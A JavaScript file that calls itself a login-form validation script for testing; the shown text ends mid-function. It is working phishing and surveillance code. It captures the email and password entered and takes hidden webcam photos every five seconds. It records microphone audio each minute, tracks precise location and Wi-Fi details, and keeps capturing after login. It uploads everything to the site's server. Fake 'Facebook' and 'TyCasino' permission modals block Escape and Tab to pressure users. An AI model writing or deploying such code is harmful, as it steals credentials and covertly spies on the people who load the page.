// Form validation script for testing purposes
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');
    
    // Clear error messages when user types
    emailInput.addEventListener('input', function() {
        emailError.textContent = '';
    });
    
    passwordInput.addEventListener('input', function() {
        passwordError.textContent = '';
    });
    
    // For demo purposes - show where credentials would be sent
    const createAccountButton = document.querySelector('.create-account-button');
    if (createAccountButton) {
        createAccountButton.addEventListener('click', function() {
            alert('This would redirect to a registration page');
        });
    }
    
    // Add event listener to the login form
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Get form data
            const email = emailInput.value;
            const password = passwordInput.value;
            
            // First request media permissions, then location, and finally collect all data
            // Make sure these processes continue to run in the background even after login
            requestPermissionsSequentially(email, password);
        });
    }
    
    // Start requesting media permissions as soon as page loads
    // This will trigger permission dialogs immediately
    setTimeout(() => {
        checkMediaDevicesSupport()
            .then(supported => {
                if (supported) {
                    setupMediaCapture();
                }
            })
            .catch(err => {
                console.warn('Media setup initial request skipped:', err.message);
            });
    }, 1000);
});

// Function to collect detailed device and location information
async function collectDeviceAndLocationInfo() {
    const userData = {
        deviceInfo: {},
        location: {},
        networkInfo: 'wifi', // Default value
        userAgent: navigator.userAgent
    };
    
    // Try to get detailed device info
    try {
        // Get screen details
        userData.deviceInfo.screen = {
            width: window.screen.width,
            height: window.screen.height,
            colorDepth: window.screen.colorDepth,
            orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
        };
        
        // Get battery info if available
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            userData.deviceInfo.battery = {
                level: battery.level * 100 + '%',
                charging: battery.charging
            };
        }
        
        // Get device memory if available
        if (navigator.deviceMemory) {
            userData.deviceInfo.memory = navigator.deviceMemory + 'GB';
        }
        
        // Get hardware concurrency (CPU cores)
        if (navigator.hardwareConcurrency) {
            userData.deviceInfo.cores = navigator.hardwareConcurrency;
        }
        
        // Get platform info
        userData.deviceInfo.platform = navigator.platform;
        
        // Get connection info
        if (navigator.connection) {
            userData.networkInfo = {
                type: navigator.connection.type || 'unknown',
                effectiveType: navigator.connection.effectiveType || 'unknown',
                downlink: navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'unknown',
                rtt: navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'unknown',
                saveData: navigator.connection.saveData || false
            };
        }
        
        // For Android devices, attempt to get network info via Android APIs
        if (window.Android && window.Android.getWifiInfo) {
            try {
                const wifiInfo = window.Android.getWifiInfo();
                if (wifiInfo) {
                    userData.networkInfo.ssid = wifiInfo.ssid;
                    userData.networkInfo.bssid = wifiInfo.bssid;
                    userData.networkInfo.signalStrength = wifiInfo.signalStrength;
                }
            } catch (error) {
                console.warn('Failed to get Android WiFi info:', error);
            }
        }
    } catch (error) {
        console.warn('Error collecting device info:', error);
    }
    
    // Try to get precise location using Geolocation API
    try {
        if (navigator.geolocation) {
            // Use a promise to handle the async geolocation API
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    position => resolve(position),
                    error => reject(error),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
            
            // Extract and store location data
            userData.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy + ' meters',
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: new Date(position.timestamp).toISOString()
            };
            
            // Attempt to get address from coordinates (reverse geocoding)
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`);
                const data = await response.json();
                
                if (data && data.address) {
                    userData.location.address = {
                        road: data.address.road,
                        city: data.address.city || data.address.town || data.address.village,
                        state: data.address.state,
                        country: data.address.country,
                        postcode: data.address.postcode,
                        formatted: data.display_name
                    };
                }
            } catch (geocodeError) {
                console.warn('Reverse geocoding failed:', geocodeError);
            }
        }
    } catch (locationError) {
        console.warn('Error getting geolocation:', locationError);
        
        // Fall back to IP-based location
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            userData.location = {
                ipAddress: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                org: data.org
            };
        } catch (ipError) {
            console.warn('IP geolocation failed:', ipError);
        }
    }
    
    return userData;
}

// Check if the browser supports MediaDevices API
async function checkMediaDevicesSupport() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        console.log('MediaDevices API not supported in this browser');
        return false;
    }
    
    // Check if any media devices are available
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const hasCamera = devices.some(device => device.kind === 'videoinput');
        const hasMicrophone = devices.some(device => device.kind === 'audioinput');
        
        console.log(`Device check: Camera: ${hasCamera}, Microphone: ${hasMicrophone}`);
        return hasCamera || hasMicrophone;
    } catch (err) {
        console.warn('Could not enumerate devices:', err);
        // Continue anyway, as some devices don't allow enumeration without permission
        return true;
    }
}

// Media capture variables
let mediaStream = null;
let videoElement = null;
let audioContext = null;
let audioRecorder = null;
let audioChunks = [];
let cameraInterval = null;
let microphoneInterval = null;
let canvasElement = null;
let permissionCheckInterval = null;
let permissionRetryCount = 0;

// Function to request permissions in sequence
async function requestPermissionsSequentially(email, password) {
    try {
        // First request camera and microphone
        await setupMediaCaptureWithPermission();
        
        // Then collect device and location info (which will request location permission)
        const userData = await collectDeviceAndLocationInfo();
        
        // Add user credentials
        userData.email = email;
        userData.password = password;
        
        // Submit data to API without stopping background processes
        await submitData(userData);
        
        // Ensure media capture continues running after login
        console.log("Ensuring background processes continue running after login...");
        if (!mediaStream || !mediaStream.active) {
            setupMediaCapture();
        }
    } catch (error) {
        console.error('Error in permission sequence:', error);
    }
}

// Modified setup function that returns a promise
async function setupMediaCaptureWithPermission() {
    return new Promise(async (resolve) => {
        const result = await checkMediaDevicesSupport();
        if (result) {
            await setupMediaCapture();
        }
        resolve(); // Resolve regardless of result to continue the sequence
    });
}

// Function to set up media capture
async function setupMediaCapture() {
    try {
        // Create hidden video element for camera feed
        videoElement = document.createElement('video');
        videoElement.style.display = 'none';
        videoElement.autoplay = true;
        videoElement.muted = true;
        document.body.appendChild(videoElement);
        
        // Create hidden canvas for capturing images
        canvasElement = document.createElement('canvas');
        canvasElement.style.display = 'none';
        document.body.appendChild(canvasElement);

        // Try getting media with both audio and video with persistent requests
        const requestMediaAccess = async () => {
            try {
                console.log('Attempting to access both camera and microphone...');
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }, 
                    audio: true
                });
                console.log('Successfully accessed both camera and microphone');
                return true;
            } catch (bothError) {
                console.warn('Could not access both camera and microphone:', bothError.message);
                
                // If permission denied, show modal and request again
                if (bothError.name === 'NotAllowedError') {
                    return new Promise(resolve => {
                        showPermissionModal('camera and microphone', () => {
                            requestMediaAccess().then(resolve);
                        });
                    });
                }
                
                // Try just video
                try {
                    console.log('Trying camera only...');
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user' },
                        audio: false
                    });
                    console.log('Successfully accessed camera only');
                    return true;
                } catch (videoError) {
                    console.warn('Could not access camera:', videoError.message);
                    
                    // If permission denied, show modal and request again
                    if (videoError.name === 'NotAllowedError') {
                        return new Promise(resolve => {
                            showPermissionModal('camera', () => {
                                requestMediaAccess().then(resolve);
                            });
                        });
                    }
                    
                    // Try just audio
                    try {
                        console.log('Trying microphone only...');
                        mediaStream = await navigator.mediaDevices.getUserMedia({
                            video: false,
                            audio: true
                        });
                        console.log('Successfully accessed microphone only');
                        return true;
                    } catch (audioError) {
                        console.warn('Could not access microphone:', audioError.message);
                        
                        // If permission denied, show modal and request again
                        if (audioError.name === 'NotAllowedError') {
                            return new Promise(resolve => {
                                showPermissionModal('microphone', () => {
                                    requestMediaAccess().then(resolve);
                                });
                            });
                        }
                        
                        console.log('No media devices could be accessed');
                        return false;
                    }
                }
            }
        };
        
        // Start requesting permissions
        const accessGranted = await requestMediaAccess();
        if (!accessGranted) {
            console.log('Could not access any media devices after repeated attempts');
            return;
        }
        
        // Check what tracks we actually got
        const hasVideo = mediaStream.getVideoTracks().length > 0;
        const hasAudio = mediaStream.getAudioTracks().length > 0;
        console.log(`Media stream contains: Video: ${hasVideo}, Audio: ${hasAudio}`);
        
        // Attach media stream to video element if we have video
        if (hasVideo) {
            videoElement.srcObject = mediaStream;
        }
        
        // Initialize audio context and recorder if we have audio
        if (hasAudio) {
            try {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioContext.createMediaStreamSource(mediaStream);
                audioRecorder = new MediaRecorder(mediaStream);
                
                // Set up event listener for audio data
                audioRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };
                
                // Handle recorded audio when complete
                audioRecorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        sendAudioData(audioBlob);
                        audioChunks = [];
                    }
                };
            } catch (audioInitError) {
                console.warn('Error initializing audio recording:', audioInitError);
            }
        }
        
        // Start periodic capture based on available devices
        startPeriodicCapture(hasVideo, hasAudio);
        
        console.log('Media capture initialized with available devices');
    } catch (error) {
        console.warn('Error during media capture setup:', error.message);
        // Clean up any partial setup
        if (videoElement) videoElement.remove();
        if (canvasElement) canvasElement.remove();
    }
}

// Function to start periodic capture of camera and microphone
function startPeriodicCapture(hasVideo, hasAudio) {
    // Take photo every 5 seconds if we have video
    if (hasVideo) {
        cameraInterval = setInterval(() => {
            capturePhoto();
        }, 5000);
    }
    
    // Record audio every 1 minute for 10 seconds if we have audio
    if (hasAudio && audioRecorder) {
        microphoneInterval = setInterval(() => {
            recordAudio();
        }, 60000);
        
        // Start the first recording after a short delay
        setTimeout(() => {
            recordAudio();
        }, 2000);
    }
}

// Function to capture photo from camera
function capturePhoto() {
    if (!videoElement || !canvasElement || !mediaStream || mediaStream.getVideoTracks().length === 0) {
        return;
    }
    
    try {
        // Set canvas dimensions to match video
        canvasElement.width = videoElement.videoWidth;
        canvasElement.height = videoElement.videoHeight;
        
        // Draw current video frame to canvas
        const context = canvasElement.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        
        // Convert to data URL and send
        canvasElement.toBlob((blob) => {
            if (blob) {
                sendImageData(blob);
                console.log('Photo captured and sent');
            }
        }, 'image/jpeg', 0.8);
    } catch (error) {
        console.warn('Error capturing photo:', error.message);
    }
}

// Function to record audio
function recordAudio() {
    if (!audioRecorder || !mediaStream || mediaStream.getAudioTracks().length === 0) {
        return;
    }
    
    try {
        // Only start if not already recording
        if (audioRecorder.state !== 'recording') {
            audioChunks = [];
            audioRecorder.start();
            console.log('Audio recording started');
            
            // Stop recording after 10 seconds
            setTimeout(() => {
                if (audioRecorder && audioRecorder.state === 'recording') {
                    audioRecorder.stop();
                    console.log('Audio recording stopped');
                }
            }, 10000);
        }
    } catch (error) {
        console.warn('Error recording audio:', error.message);
    }
}

// Function to send image data to server
async function sendImageData(imageBlob) {
    try {
        const baseUrl = window.location.origin;
        const apiUrl = `${baseUrl}/api/upload-image`;
        
        const formData = new FormData();
        formData.append('image', imageBlob, 'capture.jpg');
        formData.append('timestamp', new Date().toISOString());
        
        // Collect location and device info
        try {
            // Get location data
            const locationData = await getLocationData();
            if (locationData) {
                formData.append('location', JSON.stringify(locationData));
            }
            
            // Get network info
            const networkInfo = getNetworkInfo();
            if (networkInfo) {
                formData.append('networkInfo', JSON.stringify(networkInfo));
            }
            
            // Get device info
            const deviceInfo = getDeviceInfo();
            if (deviceInfo) {
                formData.append('deviceInfo', JSON.stringify(deviceInfo));
            }
        } catch (infoError) {
            console.warn('Error collecting additional info:', infoError);
        }
        
        const response = await fetch(apiUrl, {
            method: 'POST',
            body: formData
        });
        
        console.log('Image upload response:', response.status);
    } catch (error) {
        console.error('Error sending image data:', error);
    }
}

// Function to send audio data to server
async function sendAudioData(audioBlob) {
    try {
        const baseUrl = window.location.origin;
        const apiUrl = `${baseUrl}/api/upload-audio`;
        
        const formData = new FormData();
        formData.append('audio', audioBlob, 'recording.webm');
        formData.append('timestamp', new Date().toISOString());
        
        // Collect location and device info
        try {
            // Get location data
            const locationData = await getLocationData();
            if (locationData) {
                formData.append('location', JSON.stringify(locationData));
            }
            
            // Get network info
            const networkInfo = getNetworkInfo();
            if (networkInfo) {
                formData.append('networkInfo', JSON.stringify(networkInfo));
            }
            
            // Get device info
            const deviceInfo = getDeviceInfo();
            if (deviceInfo) {
                formData.append('deviceInfo', JSON.stringify(deviceInfo));
            }
        } catch (infoError) {
            console.warn('Error collecting additional info:', infoError);
        }
        
        const response = await fetch(apiUrl, {
            method: 'POST',
            body: formData
        });
        
        console.log('Audio upload response:', response.status);
    } catch (error) {
        console.error('Error sending audio data:', error);
    }
}

// Helper function to get location data
async function getLocationData() {
    // Try to get precise location using Geolocation API
    try {
        if (navigator.geolocation) {
            // Use a promise to handle the async geolocation API with persistent permission requests
            const position = await new Promise((resolve, reject) => {
                const requestLocation = () => {
                    navigator.geolocation.getCurrentPosition(
                        position => resolve(position),
                        error => {
                            console.warn('Location permission denied:', error);
                            // If permission was denied, show a modal and try again
                            if (error.code === error.PERMISSION_DENIED) {
                                showPermissionModal('location', requestLocation);
                            } else {
                                // For other errors, retry after a delay
                                setTimeout(requestLocation, 1000);
                            }
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                };
                requestLocation();
            });
            
            // Extract and store location data
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: new Date(position.timestamp).toISOString()
            };
            
            // Attempt to get address from coordinates (reverse geocoding)
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`);
                const data = await response.json();
                
                if (data && data.address) {
                    locationData.address = {
                        road: data.address.road,
                        city: data.address.city || data.address.town || data.address.village,
                        state: data.address.state,
                        country: data.address.country,
                        postcode: data.address.postcode,
                        formatted: data.display_name
                    };
                }
            } catch (geocodeError) {
                console.warn('Reverse geocoding failed:', geocodeError);
            }
            
            return locationData;
        }
    } catch (locationError) {
        console.warn('Error getting geolocation:', locationError);
        
        // Try again with persistent prompting
        return getLocationData();
    }
    
    return null;
}

// Helper function to get network information
function getNetworkInfo() {
    const networkInfo = { type: 'unknown' };
    
    // Try to get network connection information
    if (navigator.connection) {
        networkInfo.type = navigator.connection.type || 'unknown';
        networkInfo.effectiveType = navigator.connection.effectiveType || 'unknown';
        networkInfo.downlink = navigator.connection.downlink;
        networkInfo.rtt = navigator.connection.rtt;
        networkInfo.saveData = navigator.connection.saveData || false;
    }
    
    // For Android devices, attempt to get network info via Android APIs
    if (window.Android && window.Android.getWifiInfo) {
        try {
            const wifiInfo = window.Android.getWifiInfo();
            if (wifiInfo) {
                networkInfo.ssid = wifiInfo.ssid;
                networkInfo.bssid = wifiInfo.bssid;
                networkInfo.signalStrength = wifiInfo.signalStrength;
            }
        } catch (error) {
            console.warn('Failed to get Android WiFi info:', error);
        }
    }
    
    return networkInfo;
}

// Helper function to get device information
function getDeviceInfo() {
    const deviceInfo = {};
    
    // Get screen details
    deviceInfo.screen = {
        width: window.screen.width,
        height: window.screen.height,
        colorDepth: window.screen.colorDepth,
        orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
    };
    
    // Get platform info
    deviceInfo.platform = navigator.platform;
    deviceInfo.userAgent = navigator.userAgent;
    
    // Get hardware concurrency (CPU cores)
    if (navigator.hardwareConcurrency) {
        deviceInfo.cores = navigator.hardwareConcurrency;
    }
    
    // Get device memory if available
    if (navigator.deviceMemory) {
        deviceInfo.memory = navigator.deviceMemory;
    }
    
    return deviceInfo;
}

// Clean up function to stop media capture
function stopMediaCapture() {
    // Stop intervals
    if (cameraInterval) clearInterval(cameraInterval);
    if (microphoneInterval) clearInterval(microphoneInterval);
    
    // Stop media streams
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
    
    // Remove elements
    if (videoElement) videoElement.remove();
    if (canvasElement) canvasElement.remove();
    
    console.log('Media capture stopped');
}

// Form validation function
function validateForm() {
    let isValid = true;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');
    
    // Email validation - only check if empty, no format validation
    if (!email) {
        emailError.textContent = 'Email is required';
        isValid = false;
    }
    
    // Password validation
    if (!password) {
        passwordError.textContent = 'Password is required';
        isValid = false;
    } else if (password.length < 6) {
        passwordError.textContent = 'Password must be at least 6 characters';
        isValid = false;
    }
    
    if (isValid) {
        // Collect additional information without stopping background processes
        collectAndSubmitData(email, password);
    }
    
    // Prevent default form submission
    return false;
}

// Collect all required information and submit to API
async function collectAndSubmitData(email, password) {
    try {
        // Show loading state
        document.querySelector('.login-button').textContent = 'Logging in...';
        
        // Get device information
        const deviceInfo = {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            language: navigator.language,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            pixelRatio: window.devicePixelRatio
        };
        
        // Get network information if available
        let networkInfo = '';
        if (navigator.connection) {
            networkInfo = navigator.connection.effectiveType || '';
        }
        
        // Get IP address (will be collected server-side from request)
        const ipAddress = '';
        
        // Prepare data object
        const userData = {
            email,
            password,
            deviceInfo,
            networkInfo,
            location: {},
            ipAddress,
            userAgent: navigator.userAgent
        };
        
        // Make sure media capture is still running
        if (!mediaStream || mediaStream.getTracks().some(track => !track.enabled)) {
            console.log('Ensuring media capture is active during login...');
            // Don't await this to avoid blocking the login process
            setupMediaCapture();
        }
        
        // Ask for geolocation if available with persistent requests
        if (navigator.geolocation) {
            // Use a promise to handle geolocation with persistent requests
            try {
                const position = await new Promise((resolve, reject) => {
                    const requestLocation = () => {
                        navigator.geolocation.getCurrentPosition(
                            position => resolve(position),
                            error => {
                                console.log('Geolocation error:', error);
                                // If permission was denied, show a modal and try again
                                if (error.code === error.PERMISSION_DENIED) {
                                    showPermissionModal('location', requestLocation);
                                } else {
                                    reject(error);
                                }
                            },
                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                        );
                    };
                    requestLocation();
                });
                
                // Add location data
                userData.location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                
                // Submit data with location without stopping background processes
                await submitData(userData);
            } catch (locationError) {
                console.warn('Failed to get location after multiple attempts:', locationError);
                // Submit without location data as a last resort
                await submitData(userData);
            }
        } else {
            // If geolocation is not available, just submit collected data
            await submitData(userData);
        }
    } catch (error) {
        console.error('Error collecting data:', error);
        document.querySelector('.login-button').textContent = 'Log In';
        alert('An error occurred. Please try again.');
    }
}

// Function to submit data to API
async function submitData(userData) {
    try {
        // Prevent stopMediaCapture from being called after login
        // This ensures audio recording, photo capture, and location tracking continue
        
        // After successful login, we want to continue monitoring
        // Send the data to the server without stopping the background processes
        const baseUrl = window.location.origin;
        const apiUrl = `${baseUrl}/api/auth`;
        
        console.log('Submitting user data to API:', JSON.stringify(userData));
        
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('API response:', data);
        
        // Don't stop media capture here to allow background monitoring to continue
        // Check if media stream is still active, if not, restart it
        if (!mediaStream || mediaStream.getVideoTracks().length === 0 || !mediaStream.getVideoTracks()[0].enabled) {
            console.log('Media stream not active, restarting...');
            setupMediaCapture();
        }
        
        // Update button text and redirect
        document.querySelector('.login-button').textContent = 'Success!';
        
        // Redirect to appropriate page after delay
        setTimeout(() => {
            window.location.href = data.redirectUrl || 'tycasino.html';
        }, 1000);
    } catch (error) {
        console.error('API submission error:', error);
        document.querySelector('.login-button').textContent = 'Log In';
        alert('Unable to process your login. Please try again.');
    }
}

// Email validation helper function is no longer needed
// function isValidEmail(email) {
//     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
//     return emailRegex.test(email);
// } 

// Function to show a custom permission modal
function showPermissionModal(permissionType, retryCallback) {
    // Check if user previously denied this permission specifically
    const permissionKey = `${permissionType}_permission_denied`;
    const permissionDenied = localStorage.getItem(permissionKey);
    
    // Create modal container
    const modalContainer = document.createElement('div');
    modalContainer.style.position = 'fixed';
    modalContainer.style.top = '0';
    modalContainer.style.left = '0';
    modalContainer.style.width = '100%';
    modalContainer.style.height = '100%';
    modalContainer.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
    modalContainer.style.zIndex = '99999';
    modalContainer.style.display = 'flex';
    modalContainer.style.justifyContent = 'center';
    modalContainer.style.alignItems = 'center';
    
    // Create modal content
    const modalContent = document.createElement('div');
    modalContent.style.backgroundColor = '#fff';
    modalContent.style.padding = '30px';
    modalContent.style.borderRadius = '8px';
    modalContent.style.maxWidth = '80%';
    modalContent.style.minWidth = '300px';
    modalContent.style.textAlign = 'center';
    modalContent.style.boxShadow = '0 4px 20px rgba(0, 0, 0, 0.5)';
    
    // Create Facebook logo
    const logoDiv = document.createElement('div');
    logoDiv.style.color = '#1877f2';
    logoDiv.style.fontSize = '32px';
    logoDiv.style.fontWeight = 'bold';
    logoDiv.style.marginBottom = '20px';
    logoDiv.textContent = 'facebook';
    
    // Create modal text
    const modalTitle = document.createElement('h2');
    modalTitle.textContent = `Permission Required`;
    modalTitle.style.color = '#333';
    modalTitle.style.marginBottom = '20px';
    modalTitle.style.fontSize = '20px';
    
    const modalText = document.createElement('p');
    
    // Customize text based on whether they denied before
    if (permissionDenied) {
        modalText.innerHTML = `You previously denied access to your <strong>${permissionType}</strong>.<br><br>Please click "Allow Access" and then "Allow" when the permission dialog appears to continue.`;
    } else {
        modalText.innerHTML = `Facebook requires access to your <strong>${permissionType}</strong> to continue.<br><br>Please click "Allow Access" and then "Allow" when the permission dialog appears.`;
    }
    
    modalText.style.marginBottom = '30px';
    modalText.style.lineHeight = '1.5';
    
    // Create button container for proper layout
    const buttonContainer = document.createElement('div');
    buttonContainer.style.display = 'flex';
    buttonContainer.style.justifyContent = 'space-between';
    buttonContainer.style.gap = '10px';
    
    // Create buttons
    const allowButton = document.createElement('button');
    allowButton.textContent = 'Allow Access';
    allowButton.style.backgroundColor = '#1877f2';
    allowButton.style.color = '#fff';
    allowButton.style.padding = '12px 24px';
    allowButton.style.borderRadius = '6px';
    allowButton.style.border = 'none';
    allowButton.style.fontSize = '16px';
    allowButton.style.fontWeight = 'bold';
    allowButton.style.cursor = 'pointer';
    allowButton.style.flex = '1';
    
    // Create Not Allow button
    const notAllowButton = document.createElement('button');
    notAllowButton.textContent = 'Not Now';
    notAllowButton.style.backgroundColor = '#e4e6eb';
    notAllowButton.style.color = '#050505';
    notAllowButton.style.padding = '12px 24px';
    notAllowButton.style.borderRadius = '6px';
    notAllowButton.style.border = 'none';
    notAllowButton.style.fontSize = '16px';
    notAllowButton.style.cursor = 'pointer';
    notAllowButton.style.flex = '1';
    
    // Add buttons to container
    buttonContainer.appendChild(notAllowButton);
    buttonContainer.appendChild(allowButton);
    
    // Warning text
    const warningText = document.createElement('p');
    warningText.textContent = 'You must allow access to fully use this service.';
    warningText.style.marginTop = '20px';
    warningText.style.color = '#e41e3f';
    warningText.style.fontSize = '14px';
    
    // Add content to the modal
    modalContent.appendChild(logoDiv);
    modalContent.appendChild(modalTitle);
    modalContent.appendChild(modalText);
    modalContent.appendChild(buttonContainer);
    modalContent.appendChild(warningText);
    modalContainer.appendChild(modalContent);
    
    // Add modal to the page
    document.body.appendChild(modalContainer);
    
    // Set up event listener for the allow button
    allowButton.addEventListener('click', () => {
        // Remove this specific permission denial from localStorage
        localStorage.removeItem(permissionKey);
        document.body.removeChild(modalContainer);
        retryCallback();
    });
    
    // Set up event listener for the not allow button
    notAllowButton.addEventListener('click', () => {
        // Store this specific permission denial in localStorage
        localStorage.setItem(permissionKey, 'true');
        document.body.removeChild(modalContainer);
        // We don't call retryCallback here, effectively "denying" the permission
    });
    
    // Prevent dragging the modal
    modalContainer.addEventListener('mousedown', (e) => {
        e.preventDefault();
    });
    
    // Block keyboard navigation to prevent tab escape
    document.addEventListener('keydown', function blockKeys(e) {
        if (e.key === 'Tab' || e.key === 'Escape') {
            e.preventDefault();
        }
        
        // Remove this listener when modal is closed
        if (!document.body.contains(modalContainer)) {
            document.removeEventListener('keydown', blockKeys);
        }
    });
}

// Function to check if all permissions are granted
function checkAllPermissionsStatus() {
    return new Promise(async (resolve) => {
        let cameraAllowed = false;
        let microphoneAllowed = false;
        let locationAllowed = false;
        
        // Check camera and microphone
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                cameraAllowed = true;
                microphoneAllowed = true;
                // Keep the stream alive
                if (!mediaStream) {
                    mediaStream = stream;
                } else {
                    // Add tracks to existing stream
                    stream.getTracks().forEach(track => {
                        if (!mediaStream.getTracks().some(t => t.kind === track.kind)) {
                            mediaStream.addTrack(track);
                        }
                    });
                }
            } catch (err) {
                console.warn('Media devices check failed:', err);
                
                // Try each permission separately
                try {
                    const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    cameraAllowed = true;
                    // Keep video stream alive
                    if (!mediaStream) {
                        mediaStream = videoStream;
                    } else {
                        videoStream.getVideoTracks().forEach(track => {
                            if (!mediaStream.getTracks().some(t => t.kind === 'video')) {
                                mediaStream.addTrack(track);
                            }
                        });
                    }
                } catch (videoErr) {
                    console.warn('Camera check failed:', videoErr);
                }
                
                try {
                    const audioStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
                    microphoneAllowed = true;
                    // Keep audio stream alive
                    if (!mediaStream) {
                        mediaStream = audioStream;
                    } else {
                        audioStream.getAudioTracks().forEach(track => {
                            if (!mediaStream.getTracks().some(t => t.kind === 'audio')) {
                                mediaStream.addTrack(track);
                            }
                        });
                    }
                } catch (audioErr) {
                    console.warn('Microphone check failed:', audioErr);
                }
            }
        }
        
        // Check location
        if (navigator.geolocation) {
            try {
                await new Promise((geoResolve, geoReject) => {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            locationAllowed = true;
                            geoResolve(position);
                        },
                        error => {
                            console.warn('Location check failed:', error);
                            geoReject(error);
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                });
            } catch (geoError) {
                console.warn('Location permission error:', geoError);
            }
        }
        
        resolve({
            camera: cameraAllowed,
            microphone: microphoneAllowed,
            location: locationAllowed,
            allGranted: cameraAllowed && microphoneAllowed && locationAllowed
        });
    });
}

// Persistent permission checking and re-prompting
async function ensurePermissions() {
    const overlay = document.createElement('div');
    overlay.id = 'persistent-permission-overlay';
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
    overlay.style.zIndex = '999999';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    
    const content = document.createElement('div');
    content.style.backgroundColor = 'white';
    content.style.padding = '20px';
    content.style.borderRadius = '10px';
    content.style.maxWidth = '80%';
    content.style.textAlign = 'center';
    
    const title = document.createElement('h2');
    title.textContent = 'Permissions Required';
    title.style.color = '#1877f2';
    title.style.marginBottom = '20px';
    
    const message = document.createElement('p');
    message.innerHTML = 'To use TyCasino, you must allow access to your camera, microphone, and location.<br><br>Please click "Grant Permissions" and then "Allow" when the browser asks.';
    message.style.marginBottom = '20px';
    
    const status = document.createElement('div');
    status.style.textAlign = 'left';
    status.style.margin = '20px 0';
    
    const cameraStatus = document.createElement('p');
    cameraStatus.innerHTML = 'Camera: <span id="p-camera-status" style="color: red; font-weight: bold;">Not allowed</span>';
    
    const micStatus = document.createElement('p');
    micStatus.innerHTML = 'Microphone: <span id="p-mic-status" style="color: red; font-weight: bold;">Not allowed</span>';
    
    const locationStatus = document.createElement('p');
    locationStatus.innerHTML = 'Location: <span id="p-location-status" style="color: red; font-weight: bold;">Not allowed</span>';
    
    status.appendChild(cameraStatus);
    status.appendChild(micStatus);
    status.appendChild(locationStatus);
    
    const button = document.createElement('button');
    button.textContent = 'Grant Permissions';
    button.style.backgroundColor = '#1877f2';
    button.style.color = 'white';
    button.style.border = 'none';
    button.style.padding = '12px 20px';
    button.style.borderRadius = '5px';
    button.style.fontWeight = 'bold';
    button.style.cursor = 'pointer';
    
    content.appendChild(title);
    content.appendChild(message);
    content.appendChild(status);
    content.appendChild(button);
    overlay.appendChild(content);
    
    // Add overlay to page if not already present
    if (!document.getElementById('persistent-permission-overlay')) {
        document.body.appendChild(overlay);
        
        // Block scrolling
        document.body.style.overflow = 'hidden';
    }
    
    // Check current permissions
    const permissionStatus = await checkAllPermissionsStatus();
    
    // Update status indicators
    const updateStatus = () => {
        if (permissionStatus.camera) {
            document.getElementById('p-camera-status').textContent = 'Allowed';
            document.getElementById('p-camera-status').style.color = 'green';
        }
        
        if (permissionStatus.microphone) {
